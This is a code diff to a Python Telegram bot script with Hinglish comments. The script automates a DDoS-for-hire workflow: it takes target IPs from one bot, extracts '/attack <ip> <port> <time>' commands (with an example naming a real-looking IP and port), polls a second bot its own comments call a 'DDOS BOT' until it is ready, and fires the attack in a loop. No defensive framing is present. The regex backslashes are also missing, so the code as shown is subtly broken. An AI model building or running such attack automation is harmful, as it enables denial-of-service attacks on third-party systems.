@@ -30,6 +30,8 @@ loop_tasks: dict[int, asyncio.Task] = {}
 ip_waiters: dict[int, asyncio.Future] = {}
 bot_b_status = "UNKNOWN"
 
+
+# ---------- LISTENERS ----------
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def ip_bot_listener(event):
     """
@@ -38,23 +40,22 @@ async def ip_bot_listener(event):
     text = event.text or ""
     print("📩 IP BOT REPLY:", repr(text))
 
-    # "CMD:" wali line dhoondo (sahi regex: s*)
+    # 1) 'CMD:' wali line nikaalo
+    # Example: "CMD: /attack 91.108.17.54 32003 30"
     m_line = re.search(r"CMD:s*(.+)", text)
     if not m_line:
         return
 
     line = m_line.group(1).strip()
 
-    # Pehle backticks ke andar ka command try karo
+    # 2) Backticks ke andar ka part, agar ho to
     m_cmd = re.search(r"`([^`]+)`", line)
     if m_cmd:
-        # e.g. `/attack 91.108.17.54 32003 30`
         raw_cmd = m_cmd.group(1).strip()
     else:
-        # fallback: leading ** ya * ya spaces hata do
         raw_cmd = line.lstrip("* ").strip()
 
-    # Sirf /attack <ip> <port> <time> pattern nikaalo (optional, extra safety)
+    # 3) Sirf /attack <ip> <port> <time> command nikaalo
     m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
     if m_attack:
         final_cmd = m_attack.group(1).strip()
@@ -71,6 +72,9 @@ async def ip_bot_listener(event):
 
 @tele.on(events.NewMessage(from_users=BOT_B))
 async def bot_b_listener(event):
+    """
+    DDOS BOT ke /status / attack / cooldown messages se status set karo.
+    """
     global bot_b_status
     text = event.text or ""
     low = text.lower()
@@ -99,6 +103,8 @@ async def bot_b_listener(event):
 
     else:
         bot_b_status = "UNKNOWN"
+
+
 # ---------- CORE LOOP ----------
 async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     global bot_b_status
@@ -154,21 +160,23 @@ Sending `.getip all {target}` to IP BOT…''',
             "🔎 Checking BOT_B `/status` until READY…"
         )
 
-        # Reset status before polling
+        # Har round se pehle status reset
         bot_b_status = "UNKNOWN"
 
         while True:
             await tele.send_message(BOT_B, "/status")
             await asyncio.sleep(2)
+            print("DEBUG status:", bot_b_status)  # debug line
+
             if bot_b_status == "READY":
                 break
+
             await context.bot.send_message(
                 chat_id,
                 f"⏸ BOT_B status: {bot_b_status} (waiting 5s…)"
             )
             await asyncio.sleep(5)
 
-        # Final command BOT_B ko bhejo
         await tele.send_message(BOT_B, final_cmd)
         await context.bot.send_message(
             chat_id,
